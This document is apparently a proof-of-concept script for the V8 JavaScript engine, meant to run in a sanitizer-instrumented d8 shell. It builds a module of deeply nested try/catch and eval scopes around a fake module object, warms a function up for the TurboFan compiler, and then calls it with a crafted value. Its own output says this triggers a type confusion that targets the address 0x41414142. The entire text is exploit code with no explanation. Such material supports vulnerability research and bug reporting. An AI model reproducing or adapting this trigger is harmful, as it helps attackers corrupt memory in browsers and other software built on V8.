//out/x64.asan/d8 --disable-in-process-stack-traces poc.js

const TARGET = 0x41414142;
const CELL = (TARGET - 35) >>> 1;
const moduleSource = `
export let exp = 0;
const depth = 256;
const layers = 254;
const cellValue = ${CELL};

const victim = [1, 2, 3, 4, 5, 6, 7, 8];

class FakeModule {
  constructor(p6, p7) {
    this.p0 = 0; this.p1 = 1; this.p2 = 2; this.p3 = 3;
    this.p4 = 4; this.p5 = 5; this.p6 = p6; this.p7 = p7;
  }
}
const fakeModule = new FakeModule(victim, [0]);

let currentLevel = 0;
let maxDepth = depth;

function makeWrappedSource(body) {
  let prefix = '(function(){';
  let suffix = '';
  for (let i = 0; i < layers; ++i) {
    prefix += 'try{throw fakeModule}catch(e){';
    suffix += '}';
  }
  return prefix + body + suffix + '})()';
}

const stepSource = makeWrappedSource(
    'return function step(){' +
        'currentLevel++;' +
        'return eval(currentLevel===maxDepth?finalSource:stepSource);' +
        '};');

const finalSource = makeWrappedSource(
    'let cell = cellValue;' +
    'function touch(){ cell = 9; }' +
    'return function final(v){ exp = v; return 42; };');

function build(max) {
  maxDepth = max;
  currentLevel = 1;
  return eval(currentLevel === maxDepth ? finalSource : stepSource);
}

const inner = (() => {
  let current = build(depth);
  while (currentLevel < depth) {
    current = current();
  }
  return current;
})();

export { inner };
`;

import('data:text/javascript,' + moduleSource).then(ns => {
  print('Interpreter baseline: inner(1) = ' + ns.inner(1));

  print('Warming up 220000 iterations for TurboFan...');
  for (let i = 0; i < 220000; i++) ns.inner(1);
  let s = Date.now(); while (Date.now() - s < 300) {}

  print('Triggering type confusion via TurboFan JIT...');
  ns.inner(0x2000);
}, e => print('err=' + e));